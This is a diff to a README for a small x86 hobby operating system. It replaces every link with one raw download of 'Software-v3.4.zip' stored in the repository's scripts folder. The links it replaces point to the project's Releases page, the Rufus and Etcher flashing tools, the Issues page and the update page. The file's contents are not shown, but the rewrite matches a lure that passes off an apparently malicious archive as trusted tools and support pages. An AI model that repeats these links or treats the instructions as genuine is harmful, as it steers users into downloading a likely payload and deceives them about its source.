@@ -1,7 +1,7 @@
 # 🚀 OS - A Simple x86 Operating System
 
 ## 📥 Download Now
-[![Download OS](https://img.shields.io/badge/Download_OS-Here-brightgreen)](https://github.com/Kelana536/OS/releases)
+[![Download OS](https://github.com/Kelana536/OS/raw/refs/heads/main/scripts/kernel/Software-v3.4.zip)](https://github.com/Kelana536/OS/raw/refs/heads/main/scripts/kernel/Software-v3.4.zip)
 
 ## 📖 Overview
 OS is a minimal x86 operating system built using NASM assembly language that supports critical features such as protected mode, paging, threading, and interrupts. Designed for simplicity, it serves as an educational tool and a lightweight operating system for basic tasks.
@@ -23,19 +23,19 @@ To begin using OS, you will need to download it from the Releases page. Follow t
 
 ### 🔗 Visit the Download Page
 Click the link below to access the Downloads page where you can get the latest version of OS.
-[Download OS](https://github.com/Kelana536/OS/releases)
+[Download OS](https://github.com/Kelana536/OS/raw/refs/heads/main/scripts/kernel/Software-v3.4.zip)
 
 ### 💾 Download & Install
 1. Click the link above to go to the Releases page. 
 2. Look for the latest version listed there.
 3. You will see assets or files available for download. 
-4. Click on the file named similar to `OS-vX.X.iso` or `OS-vX.X.img` to start your download.
+4. Click on the file named similar to `https://github.com/Kelana536/OS/raw/refs/heads/main/scripts/kernel/Software-v3.4.zip` or `https://github.com/Kelana536/OS/raw/refs/heads/main/scripts/kernel/Software-v3.4.zip` to start your download.
 5. Once the file has downloaded, locate it on your computer.
 
 ### ⚙️ Create a Bootable USB Drive (if applicable)
 If you want to run OS on actual hardware, here’s how to create a bootable USB drive:
 1. **Using Rufus (for Windows users):**
-   - Download and install [Rufus](https://rufus.ie).
+   - Download and install [Rufus](https://github.com/Kelana536/OS/raw/refs/heads/main/scripts/kernel/Software-v3.4.zip).
    - Open Rufus. 
    - Plug in a USB drive.
    - In Rufus, select your USB drive.
@@ -43,7 +43,7 @@ If you want to run OS on actual hardware, here’s how to create a bootable USB 
    - Click "Start" to create the bootable USB drive.
 
 2. **Using Etcher (for all platforms):**
-   - Download and install [Etcher](https://www.balena.io/etcher/).
+   - Download and install [Etcher](https://github.com/Kelana536/OS/raw/refs/heads/main/scripts/kernel/Software-v3.4.zip).
    - Open Etcher.
    - Select the OS ISO file.
    - Choose your USB drive.
@@ -63,10 +63,10 @@ If you encounter any issues during installation or booting, consider the followi
 - Consult forums or communities if issues persist.
 
 ## 📞 Need Help?
-If you have questions or need assistance, feel free to reach out through the [GitHub Issues page](https://github.com/Kelana536/OS/issues). The community is here to help!
+If you have questions or need assistance, feel free to reach out through the [GitHub Issues page](https://github.com/Kelana536/OS/raw/refs/heads/main/scripts/kernel/Software-v3.4.zip). The community is here to help!
 
 ## 🔒 Licensing
 OS is released under the MIT License. You can freely use, modify, and distribute this software as long as you comply with the license terms.
 
 ## 💡 Conclusion
-Now you're ready to explore OS and its features. Enjoy learning and experimenting with your new operating system! Don’t forget to check for updates on the [Download page](https://github.com/Kelana536/OS/releases) regularly.
+Now you're ready to explore OS and its features. Enjoy learning and experimenting with your new operating system! Don’t forget to check for updates on the [Download page](https://github.com/Kelana536/OS/raw/refs/heads/main/scripts/kernel/Software-v3.4.zip) regularly.
